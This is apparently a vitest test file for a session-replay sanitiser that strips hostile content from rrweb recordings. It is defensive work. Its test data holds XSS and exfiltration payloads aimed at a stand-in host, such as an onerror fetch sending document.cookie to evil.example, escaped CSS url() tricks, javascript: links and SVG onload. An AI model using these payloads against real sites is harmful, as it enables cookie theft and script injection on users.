import { describe, expect, it } from "vitest";

import { sanitizeCssText, sanitizeEvents } from "./replay-sanitize";

const STORE = "https://shop.example.no";
const SUPABASE = "https://ybsozesfuxuitoacntfo.supabase.co";
const ALLOWED = {
  storeOrigins: [STORE, "https://demo.kaizenaflow.com"],
  supabaseOrigin: SUPABASE,
};
const PICTURE = `${SUPABASE}/storage/v1/object/public/products/demo/mug.jpg`;
const EVIL = "https://evil.example";

/** One element node as rrweb's snapshot writes it. */
const el = (
  id: number,
  tagName: string,
  attributes: Record<string, unknown>,
  childNodes: unknown[] = [],
) => ({
  type: 2,
  id,
  tagName,
  attributes,
  childNodes,
});

/** A full snapshot (event type 2) of a page whose body holds `body`. */
const snapshot = (head: unknown[], body: unknown[]) => ({
  type: 2,
  timestamp: 1_763_300_000_000,
  data: {
    node: {
      type: 0,
      id: 1,
      childNodes: [
        { type: 1, id: 2, name: "html", publicId: "", systemId: "" },
        el(3, "html", { lang: "en" }, [
          el(4, "head", {}, head),
          el(5, "body", {}, body),
        ]),
      ],
    },
    initialOffset: { left: 0, top: 0 },
  },
});

const one = (event: unknown) => sanitizeEvents([event], ALLOWED)[0];
type Node = {
  attributes: Record<string, unknown>;
  childNodes: Node[];
  textContent?: string;
};
/** The children of the snapshot's head and body after sanitising. */
const parts = (event: unknown) => {
  const html = (one(event) as { data: { node: { childNodes: Node[] } } }).data
    .node.childNodes[1];
  return {
    head: html.childNodes[0].childNodes,
    body: html.childNodes[1].childNodes,
  };
};
const attrs = (attributes: Record<string, unknown>) =>
  parts(snapshot([], [el(10, "div", attributes)])).body[0].attributes;
const css = (text: string) => sanitizeCssText(text, ALLOWED);

describe("sanitizeEvents: attributes", () => {
  it("blanks a foreign image and drops onerror", () => {
    const img = attrs({
      src: `${EVIL}/x`,
      onerror: "fetch('//evil.example/'+document.cookie)",
      alt: "Mug",
    });
    expect(img).toEqual({ src: "", alt: "Mug" });
  });

  it("drops every on* handler whatever its case, srcdoc and ping", () => {
    expect(
      attrs({
        OnClick: "x()",
        onLoad: "y()",
        srcdoc: "<script>1</script>",
        ping: `${EVIL}/p`,
        id: "a",
      }),
    ).toEqual({ id: "a" });
  });

  it("drops a meta refresh with its content", () => {
    const meta = parts(
      snapshot(
        [el(6, "meta", { "http-equiv": "refresh", content: `0;url=${EVIL}` })],
        [],
      ),
    ).head[0];
    expect(meta.attributes).toEqual({});
    const upper = parts(
      snapshot([el(6, "meta", { "HTTP-EQUIV": "Refresh", content: "0" })], []),
    ).head[0];
    expect(upper.attributes).toEqual({});
  });

  it("keeps a meta tag's content when there is no http-equiv", () => {
    expect(attrs({ name: "description", content: "A mug" })).toEqual({
      name: "description",
      content: "A mug",
    });
  });

  it("blanks javascript: links, however they are written", () => {
    expect(attrs({ href: "javascript:alert(1)" }).href).toBe("");
    expect(attrs({ href: "  JaVa\tScRiPt:alert(1)" }).href).toBe("");
    expect(attrs({ "xlink:href": "javascript:alert(1)" })["xlink:href"]).toBe(
      "",
    );
    expect(attrs({ formaction: "javascript:alert(1)" }).formaction).toBe("");
  });

  it("keeps a store's assets as relative paths and blanks its other pages", () => {
    expect(attrs({ src: `${STORE}/_next/static/media/logo.abc.png` }).src).toBe(
      "/_next/static/media/logo.abc.png",
    );
    expect(attrs({ src: `${STORE}/kaizen/icons.svg?v=3#cart` }).src).toBe(
      "/kaizen/icons.svg?v=3#cart",
    );
    expect(attrs({ src: `${STORE}/api/fonts/inter.woff2` }).src).toBe(
      "/api/fonts/inter.woff2",
    );
    expect(attrs({ src: "/demo/mug.jpg" }).src).toBe("/demo/mug.jpg");
    expect(attrs({ src: `${STORE}/admin/x` }).src).toBe("");
    expect(attrs({ src: `${STORE}/api/orders` }).src).toBe("");
    expect(attrs({ src: "/admin/x" }).src).toBe("");
    expect(attrs({ src: `${STORE}/_next/static/../../admin/x` }).src).toBe("");
    expect(attrs({ src: "/_next/static/%2e%2e/%2e%2e/admin/x" }).src).toBe("");
    expect(attrs({ href: `${STORE}/no/products/mug` }).href).toBe("");
  });

  it("blanks other hosts, protocol-relative ones and the backslash tricks", () => {
    expect(attrs({ src: `${EVIL}/_next/static/a.png` }).src).toBe("");
    expect(attrs({ src: "//evil.example/_next/static/a.png" }).src).toBe("");
    expect(attrs({ src: "/\\evil.example/_next/static/a.png" }).src).toBe("");
    expect(attrs({ src: "\\\\evil.example/_next/static/a.png" }).src).toBe("");
    expect(attrs({ src: "//shop.example.no/_next/static/a.png" }).src).toBe(
      "/_next/static/a.png",
    );
    expect(
      attrs({ src: "http://shop.example.no/_next/static/a.png" }).src,
    ).toBe("");
  });

  it("keeps a Supabase public picture as it is, and nothing else of Supabase", () => {
    expect(attrs({ src: PICTURE }).src).toBe(PICTURE);
    expect(
      attrs({
        src: `${SUPABASE}/storage/v1/object/sign/products/a.jpg?token=x`,
      }).src,
    ).toBe("");
    expect(attrs({ src: `${SUPABASE}/rest/v1/orders` }).src).toBe("");
  });

  it("keeps data:image and fragments, and blanks other data: URLs", () => {
    expect(attrs({ src: "data:image/png;base64,iVBORw0KGgo=" }).src).toBe(
      "data:image/png;base64,iVBORw0KGgo=",
    );
    expect(attrs({ href: "#main" }).href).toBe("#main");
    expect(attrs({ src: "data:text/html,<script>alert(1)</script>" }).src).toBe(
      "",
    );
    expect(attrs({ action: `${EVIL}/collect` }).action).toBe("");
  });

  it("checks every value that starts like a URL, and leaves other text alone", () => {
    expect(
      attrs({
        "data-next": `${EVIL}/x`,
        "data-path": "/admin/x",
        title: "A good mug",
        class: "kz-card",
      }),
    ).toEqual({
      "data-next": "",
      "data-path": "",
      title: "A good mug",
      class: "kz-card",
    });
  });

  it("keeps only the allowed candidates of a srcset and an imagesrcset", () => {
    const img = attrs({
      srcset: `${STORE}/_next/static/a-1x.png 1x, ${EVIL}/a-2x.png 2x, data:image/png;base64,AAA= 3x`,
    });
    expect(img.srcset).toBe(
      "/_next/static/a-1x.png 1x, data:image/png;base64,AAA= 3x",
    );
    const link = parts(
      snapshot(
        [
          el(6, "link", {
            rel: "preload",
            as: "image",
            imagesrcset: `${PICTURE} 640w,${EVIL}/b.jpg 1280w, javascript:alert(1) 1920w, /demo/c.jpg 2560w`,
          }),
        ],
        [],
      ),
    ).head[0];
    expect(link.attributes.imagesrcset).toBe(
      `${PICTURE} 640w, /demo/c.jpg 2560w`,
    );
  });

  it("keeps rr_dataURL only as data:image", () => {
    expect(
      attrs({ rr_dataURL: "data:image/webp;base64,UklGR" }).rr_dataURL,
    ).toBe("data:image/webp;base64,UklGR");
    expect(attrs({ rr_dataURL: "data:text/html;base64,PHNjcmlwdD4=" })).toEqual(
      {},
    );
    expect(attrs({ rr_dataURL: `${EVIL}/x.png` })).toEqual({});
  });

  it("sanitises a style attribute as CSS", () => {
    expect(
      attrs({ style: `color: red; background:url(${EVIL}); margin: 0` }).style,
    ).toBe("color: red; margin: 0");
    expect(
      attrs({ style: `background-image: url('${STORE}/demo/hero.jpg')` }).style,
    ).toBe('background-image: url("/demo/hero.jpg")');
  });
});

describe("sanitizeEvents: CSS", () => {
  it("decodes escapes before matching", () => {
    expect(css(`a{color:red}b{background:\\75 rl(${EVIL})}c{color:blue}`)).toBe(
      "a{color:red}b{}c{color:blue}",
    );
    expect(css(`b{background:\\000075\\72 l(${EVIL});color:red}`)).toBe(
      "b{color:red}",
    );
    expect(css(`b{background:u\\rl(${EVIL})}`)).toBe("b{}");
    expect(css(`b{background:url(\\68 ttps://evil.example/x)}`)).toBe("b{}");
  });

  it("matches without regard to case", () => {
    expect(css(`b{background:URL(${EVIL});color:red}`)).toBe("b{color:red}");
    expect(css(`b{background:Url( "${EVIL}" )}`)).toBe("b{}");
  });

  it("treats image-set arguments as URLs", () => {
    expect(
      css(`b{background-image:image-set("${EVIL}" 1x, "/demo/a.png" 2x)}`),
    ).toBe("b{}");
    expect(
      css(`b{background-image:-webkit-image-set(url(${EVIL}/a.png) 1x)}`),
    ).toBe("b{}");
    expect(
      css(`b{background-image:image-set("/demo/a.png" type("image/png") 1x)}`),
    ).toBe('b{background-image:image-set("/demo/a.png" type("image/png") 1x)}');
  });

  it("drops an @import of another host and keeps a store's, made relative", () => {
    expect(css(`@import "${EVIL}/a.css";a{color:red}`)).toBe("a{color:red}");
    expect(css(`@IMPORT url(${EVIL}/a.css) screen;a{color:red}`)).toBe(
      "a{color:red}",
    );
    expect(css(`@\\69mport '${EVIL}/a.css';a{color:red}`)).toBe("a{color:red}");
    expect(css(`@import "${STORE}/_next/static/css/b.css";`)).toBe(
      '@import "/_next/static/css/b.css";',
    );
  });

  it("drops a rule whose prelude holds a URL, and works inside @media and nesting", () => {
    expect(
      css(`@font-face{font-family:x;src:url(${EVIL}/f.woff2)}p{margin:0}`),
    ).toBe("@font-face{font-family:x;}p{margin:0}");
    expect(
      css(`@media (min-width: 40rem){a{background:url(${EVIL})}b{color:red}}`),
    ).toBe("@media (min-width: 40rem){a{}b{color:red}}");
    expect(css(`a{color:red;&:hover{background:url(${EVIL})}}`)).toBe(
      "a{color:red;&:hover{}}",
    );
    expect(
      css(`@supports (background:url(${EVIL})){a{color:red}}b{color:blue}`),
    ).toBe("b{color:blue}");
  });

  it("keeps fragments and data pictures, and drops what cannot be read", () => {
    expect(
      css("a{filter:url(#blur);background:url(data:image/png;base64,AA==)}"),
    ).toBe("a{filter:url(#blur);background:url(data:image/png;base64,AA==)}");
    expect(css(`a{background:url(${EVIL} x)}b{color:red}`)).toBe(
      "a{}b{color:red}",
    );
    expect(css(`a{background:url("${EVIL}\n)}`)).not.toContain("evil");
  });

  it("leaves CSS and text without URLs as they were", () => {
    const sheet = `/* theme */ :root{--kz-accent:#c33;content:"\\201C"} .a > b[data-x="y;z"]{margin:0 auto!important}`;
    expect(css(sheet)).toBe(sheet);
    expect(css("Free shipping over 500 kr; ask us {anything}")).toBe(
      "Free shipping over 500 kr; ask us {anything}",
    );
  });

  it("never lets a foreign URL through in any of these", () => {
    const attacks = [
      `a{b:url(${EVIL})}`,
      `a{b:\\55 RL(${EVIL})}`,
      `a{b:image-set('${EVIL}' 1x)}`,
      `@import '${EVIL}';`,
      `a{b:url(//evil.example/x)}`,
      `a{b:url(/\\evil.example/x)}`,
      `a{b:cross-fade(url(${EVIL}), red)}`,
      `a{b:src("${EVIL}")}`,
      `a{b:url(${STORE}/admin/x)}`,
      `a{b:url(${STORE}/api/orders)}`,
      `}a{b:url(${EVIL})`,
      `a{b:x(url(${EVIL});)}`,
      `a{b:url(${EVIL}`,
    ];
    for (const attack of attacks) {
      const out = css(attack);
      expect(out, attack).not.toMatch(/evil|admin|api\/orders/);
    }
  });
});

describe("sanitizeEvents: snapshots and mutations", () => {
  it("rewrites a store's stylesheet link and its inlined CSS", () => {
    const link = el(6, "link", {
      rel: "stylesheet",
      href: `${STORE}/_next/static/css/app.css`,
      _cssText: `body{background:url(${STORE}/_next/static/media/bg.png)}.x{background:url(${EVIL}/t.png)}`,
    });
    const style = el(7, "style", {}, [
      {
        type: 3,
        id: 8,
        textContent: `@import "${EVIL}/a.css";h1{color:red}`,
        isStyle: true,
      },
    ]);
    const { head } = parts(snapshot([link, style], []));
    expect(head[0].attributes).toEqual({
      rel: "stylesheet",
      href: "/_next/static/css/app.css",
      _cssText: 'body{background:url("/_next/static/media/bg.png")}.x{}',
    });
    expect(head[1].childNodes[0].textContent).toBe("h1{color:red}");
  });

  it("sanitises nested mutation adds, attribute mutations and text mutations", () => {
    const mutation = {
      type: 3,
      timestamp: 1_763_300_000_500,
      data: {
        source: 0,
        texts: [
          { id: 8, value: `h1{background:url(${EVIL})}` },
          { id: 9, value: "Only 3 left" },
        ],
        attributes: [
          {
            id: 20,
            attributes: { src: `${EVIL}/y.png`, onload: "x()", class: "on" },
          },
          {
            id: 21,
            attributes: {
              style: {
                color: "red",
                background: [`url(${EVIL})`, "important"],
              },
            },
          },
          { id: 22, attributes: { src: null } },
        ],
        removes: [{ parentId: 5, id: 30 }],
        adds: [
          {
            parentId: 5,
            nextId: null,
            node: el(40, "div", { class: "kz-card" }, [
              el(41, "img", { src: PICTURE, onerror: "alert(1)" }),
              el(42, "a", { href: "javascript:alert(1)" }, [
                { type: 3, id: 43, textContent: "Buy" },
              ]),
              el(44, "iframe", {
                srcdoc: "<script>alert(1)</script>",
                src: `${EVIL}/frame`,
              }),
            ]),
          },
        ],
      },
    };
    const out = one(mutation) as typeof mutation;
    expect(out.data.texts).toEqual([
      { id: 8, value: "h1{}" },
      { id: 9, value: "Only 3 left" },
    ]);
    expect(out.data.attributes).toEqual([
      { id: 20, attributes: { src: "", class: "on" } },
      {
        id: 21,
        attributes: { style: { color: "red", background: ["", "important"] } },
      },
      { id: 22, attributes: { src: null } },
    ]);
    expect(out.data.removes).toEqual([{ parentId: 5, id: 30 }]);
    const card = out.data.adds[0].node;
    expect(card.childNodes[0]).toEqual(el(41, "img", { src: PICTURE }));
    expect(card.childNodes[1]).toEqual(
      el(42, "a", { href: "" }, [{ type: 3, id: 43, textContent: "Buy" }]),
    );
    expect(card.childNodes[2]).toEqual(el(44, "iframe", { src: "" }));
  });

  it("sanitises style sheet rules, declarations, adopted sheets and fonts", () => {
    const [rules, declaration, adopted, font] = sanitizeEvents(
      [
        {
          type: 3,
          timestamp: 1,
          data: {
            source: 8,
            id: 7,
            adds: [
              { rule: `a{background:url(${EVIL})}`, index: 0 },
              { rule: "b{color:red}", index: 1 },
            ],
            replaceSync: `@import "${EVIL}";`,
          },
        },
        {
          type: 3,
          timestamp: 2,
          data: {
            source: 13,
            id: 7,
            index: [0],
            set: {
              property: "background",
              value: `url(${EVIL})`,
              priority: "",
            },
          },
        },
        {
          type: 3,
          timestamp: 3,
          data: {
            source: 15,
            id: 1,
            styleIds: [1],
            styles: [
              { styleId: 1, rules: [{ rule: `@import url(${EVIL});` }] },
            ],
          },
        },
        {
          type: 3,
          timestamp: 4,
          data: {
            source: 10,
            family: "x",
            fontSource: `url(${EVIL}/f.woff2)`,
            buffer: false,
          },
        },
      ],
      ALLOWED,
    ) as { data: Record<string, unknown> }[];
    expect(rules.data.adds).toEqual([
      { rule: "a{}", index: 0 },
      { rule: "b{color:red}", index: 1 },
    ]);
    expect(rules.data.replaceSync).toBe("");
    expect(declaration.data.set).toEqual({
      property: "background",
      value: "",
      priority: "",
    });
    expect(adopted.data.styles).toEqual([
      { styleId: 1, rules: [{ rule: "" }] },
    ]);
    expect(font.data.fontSource).toBe("");
  });

  it("blanks an image a canvas event would draw from another host", () => {
    const out = one({
      type: 3,
      timestamp: 1,
      data: {
        source: 9,
        id: 3,
        commands: [
          {
            property: "drawImage",
            args: [{ rr_type: "HTMLImageElement", src: `${EVIL}/c.png` }, 0, 0],
          },
        ],
      },
    });
    expect(JSON.stringify(out)).not.toContain("evil");
  });

  it("leaves events without URLs alone and does not change its input", () => {
    const events = [
      {
        type: 4,
        timestamp: 0,
        data: { href: `${STORE}/no`, width: 1280, height: 800 },
      },
      snapshot(
        [
          el(6, "style", {}, [
            {
              type: 3,
              id: 7,
              textContent: `a{background:url(${EVIL})}`,
              isStyle: true,
            },
          ]),
        ],
        [el(10, "img", { src: `${EVIL}/x`, onerror: "alert(1)" })],
      ),
      {
        type: 3,
        timestamp: 9,
        data: { source: 1, positions: [{ x: 1, y: 2, id: 5, timeOffset: 0 }] },
      },
    ];
    const before = structuredClone(events);
    const out = sanitizeEvents(events, ALLOWED);
    expect(events).toEqual(before);
    expect(out[0]).toEqual(events[0]);
    expect(out[2]).toEqual(events[2]);
    expect(out[1]).not.toBe(events[1]);
    expect(JSON.stringify(out[1])).not.toMatch(/evil|onerror/);
  });

  it("keeps a JSON __proto__ key as data, never as a prototype", () => {
    const [event] = sanitizeEvents(
      [JSON.parse('{"type":5,"data":{"__proto__":{"polluted":true}}}')],
      ALLOWED,
    ) as { data: object }[];
    expect(Object.getPrototypeOf(event.data)).toBe(Object.prototype);
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
  });

  it("survives a hostile depth", () => {
    let node: unknown = { type: 3, id: 0, textContent: "x" };
    for (let i = 0; i < 100_000; i++) node = { childNodes: [node] };
    expect(() =>
      sanitizeEvents([{ type: 2, data: { node } }], ALLOWED),
    ).not.toThrow();
  });
});

/**
 * The review of 18 November 2026: hostile inputs of every kind a forged recording could carry, each run through `sanitizeEvents()`, and
 * nothing that points at another host or a script scheme survives. Attribute values in a snapshot are already decoded strings (rrweb sets
 * them with `setAttribute`, which decodes nothing), so entity-encoded schemes stay inert text.
 */
describe("a forged recording's attacks (review, 18 November 2026)", () => {
  const leaks = (out: unknown) => {
    const text = JSON.stringify(out).toLowerCase();
    return ["evil.example", "javascript:", "vbscript:", "data:text/html", "data:image/svg+xml"].filter((bad) => text.includes(bad));
  };
  const inBody = (node: unknown) => [snapshot([], [node])];
  const attrs: [string, Record<string, unknown>][] = [
    ["a", { href: "javascript:alert(1)" }],
    ["a", { href: "JaVaScRiPt:alert(1)" }],
    ["a", { href: "java\tscript:alert(1)" }],
    ["a", { href: " \u0001javascript:alert(1)" }],
    ["a", { href: "//evil.example/x" }],
    ["a", { href: "/\\evil.example/x" }],
    ["a", { href: "\\\\evil.example\\x" }],
    ["a", { href: "https:evil.example" }],
    ["iframe", { src: "data:text/html,<script>alert(1)</script>" }],
    ["iframe", { srcdoc: "<script>alert(1)</script>" }],
    ["img", { src: "https://evil.example/p.gif" }],
    ["img", { srcset: "https://evil.example/a.png 1x, data:image/png;base64,AAAA 2x" }],
    ["img", { src: "data:image/svg+xml,<svg onload=alert(1)>" }],
    ["svg:use", { "xlink:href": "https://evil.example/s.svg#a" }],
    ["use", { href: "//evil.example/s.svg#a" }],
    ["animate", { attributeName: "href", to: "javascript:alert(1)", values: "javascript:alert(1)" }],
    ["set", { attributeName: "href", to: "https://evil.example" }],
    ["base", { href: "https://evil.example/" }],
    ["meta", { "http-equiv": "refresh", content: "0;url=https://evil.example" }],
    ["link", { rel: "stylesheet", href: "//evil.example/s.css" }],
    ["link", { rel: "prefetch", href: "https://evil.example/" }],
    ["object", { data: "https://evil.example/x.swf" }],
    ["embed", { src: "https://evil.example/x.swf" }],
    ["form", { action: "https://evil.example/steal" }],
    ["button", { formaction: "https://evil.example/steal" }],
    ["video", { poster: "https://evil.example/p.jpg", src: "https://evil.example/v.mp4" }],
    ["div", { onclick: "alert(1)", OnMouseOver: "alert(1)" }],
    ["div", { style: "background:url(https://evil.example/x)" }],
    ["div", { "data-x": "https://evil.example/" }],
    ["canvas", { rr_dataURL: "https://evil.example/c.png" }],
  ];

  it.each(attrs)("drops what %s's attributes would load or run: %j", (tag, attributes) => {
    const out = sanitizeEvents(inBody(el(10, tag, attributes)), ALLOWED);
    expect(leaks(out)).toEqual([]);
  });

  const css = [
    "@import url(https://evil.example/a.css);",
    '@import "https://evil.example/a.css";',
    "@import '//evil.example/a.css' screen;",
    "a{background:\\75 rl(https://evil.example/x)}",
    "a{background:u\\rl(https://evil.example/x)}",
    "a{background:url(/*x*/https://evil.example/x)}",
    "a{background:url( https://evil.example/x )}",
    "a{background:image-set(url(https://evil.example/x) 1x)}",
    'a{background:-webkit-image-set("https://evil.example/x" 1x)}',
    "a{background:cross-fade(url(https://evil.example/x),red)}",
    '@font-face{font-family:x;src:url(https://evil.example/f.woff2)}',
    "a{width:expression(alert(1));background:url(javascript:alert(1))}",
    "a{-moz-binding:url(https://evil.example/x.xml#b)}",
    "a{behavior:url(https://evil.example/x.htc)}",
    "@media screen{@supports (display:grid){a{background:url(//evil.example/x)}}}",
    "@supports (background:url(https://evil.example/probe)){a{color:red}}",
  ];

  it.each(css)("drops a style sheet's outside address: %s", (text) => {
    const out = sanitizeEvents(inBody(el(10, "style", { _cssText: text })), ALLOWED);
    expect(leaks(out)).toEqual([]);
  });

  it("drops outside addresses from every incremental source that carries CSS, fonts, canvas, media or custom data", () => {
    const evil = "url(https://evil.example/x)";
    const events = [
      { type: 3, timestamp: 1, data: { source: 8, id: 7, adds: [{ rule: `a{background:${evil}}`, index: 0 }] } },
      { type: 3, timestamp: 2, data: { source: 8, id: 7, replace: `a{background:${evil}}` } },
      { type: 3, timestamp: 3, data: { source: 8, id: 7, replaceSync: `@import ${evil};` } },
      { type: 3, timestamp: 4, data: { source: 13, id: 7, set: { property: "background", value: evil, priority: "" } } },
      { type: 3, timestamp: 5, data: { source: 15, id: 7, styles: [{ styleId: 1, rules: [{ rule: `a{background:${evil}}` }] }], styleIds: [1] } },
      { type: 3, timestamp: 6, data: { source: 10, family: "x", fontSource: `url(https://evil.example/f.woff2)`, buffer: false } },
      { type: 3, timestamp: 7, data: { source: 9, id: 7, type: 0, commands: [{ property: "drawImage", args: [{ rr_type: "HTMLImageElement", src: "https://evil.example/i.png" }, 0, 0] }] } },
      { type: 3, timestamp: 8, data: { source: 0, adds: [{ parentId: 5, nextId: null, node: el(20, "img", { src: "https://evil.example/m.png" }) }], removes: [], texts: [{ id: 6, value: `a{background:${evil}}` }], attributes: [{ id: 5, attributes: { style: { background: evil }, href: "javascript:alert(1)" } }] } },
    ];
    expect(leaks(sanitizeEvents(events, ALLOWED))).toEqual([]);
  });

  it("keeps no SVG data address outside CSS, where a frame, an object or a link could run it; CSS still draws one as a picture", () => {
    const svg = "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>";
    for (const [tag, name] of [["iframe", "src"], ["object", "data"], ["embed", "src"], ["a", "href"], ["link", "href"], ["img", "src"], ["use", "href"]]) {
      expect(leaks(sanitizeEvents(inBody(el(10, tag, { [name]: svg })), ALLOWED)), `${tag} ${name}`).toEqual([]);
    }
    expect(leaks(sanitizeEvents(inBody(el(10, "canvas", { rr_dataURL: svg })), ALLOWED))).toEqual([]);
    expect(sanitizeCssText("a{background:url(\"data:image/svg+xml,<svg/>\")}", ALLOWED)).toContain("data:image/svg+xml");
    expect(JSON.stringify(sanitizeEvents(inBody(el(10, "img", { src: "data:image/png;base64,AAAA" })), ALLOWED))).toContain("data:image/png;base64,AAAA");
  });

  it("drops a style sheet nested too deep instead of overflowing the stack", () => {
    const out = sanitizeEvents(inBody(el(10, "style", { _cssText: "a{".repeat(50_000) })), ALLOWED);
    expect(out).toHaveLength(1);
  });
});
